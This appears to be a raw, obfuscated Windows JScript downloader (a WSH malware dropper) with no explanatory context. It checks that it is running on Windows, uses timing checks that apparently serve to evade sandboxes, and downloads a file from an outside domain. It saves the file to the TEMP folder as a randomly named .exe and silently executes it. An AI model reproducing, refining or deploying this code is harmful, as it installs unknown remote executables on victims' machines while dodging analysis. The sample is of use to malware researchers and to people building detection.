var Bc = false;
var Pe = "CreateObject";
var E = function mZ() {return WScript[Pe]("WScript.Shell");}(), u1 = 11;
var NJ = "MSXML2.XMLHTTP";
var u0 = 2123213;
var O = 0;
function qq(yr){E["Run"](yr, O, O);};
function Vr(){return "" + NJ;};
function YW(BU, Q){O = O * 1; return BU - Q;};
function U(){return Pe;};
/*@cc_on
  @if (@_win32 || @_win64)
    Bc = true;
  @end
@*/
if (Bc)
{
var c = "";
function yf(){return 22;};
var i = 0; var D = 0;
function wU()
{
var U0 = new this["Date"]();
var Lk = U0["getUTCMilliseconds"]();
WScript["Sleep"](yf());
var U0 = new this["Date"]();
var Cz = U0["getUTCMilliseconds"]();
WScript["Sleep"](yf());
var U0 = new this["Date"]();
var Y = U0["getUTCMilliseconds"]();
var i = "Mt";
i = YW(Cz, Lk);
var D = "R";
D = YW(Y, Cz);
c = "open";
return YW(i, D);
}
var x = false;
var W = false;
for (var Fo = O; Fo < yf() * 1; Fo++){if (wU() != O){
x = true; 
D = "31" + 11 * i + D; 
W = true; 
break;
}}
function Jz() {return ((x == true) && (x == W)) ? 1 : O;};
if (x && Jz() && W){
function g() {return E["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "OBDRqdBwviY.exe";};
 W0 = Vr();
 V = WScript[Pe](W0);
 var z = 1;
 while (z){
try {
V[c]("GET", "http://xn--kandypriv-j4a.com/lo4sad", false);
V["send"]();
G = "Sleep";
for (;;){WScript[G](yf() * 11); if (V["readystate"] >= 2 * 2) break;};
z = O;
} catch(e){};
}
function sE(ar) {var s = (1, 2, 3, 4, 5, ar); return s;};
D0 = WScript[U()]("ADODB.Stream");
W0 = D0;
W0[c]();
W0["type"] = sE(1);
W0["write"](V["ResponseBody"]);
D0["position"] = sE(O);
W0["Save" + "ToFile"](g(), 2);
D0["c"+"lose"]();
u = g();
qq(u);
}
}

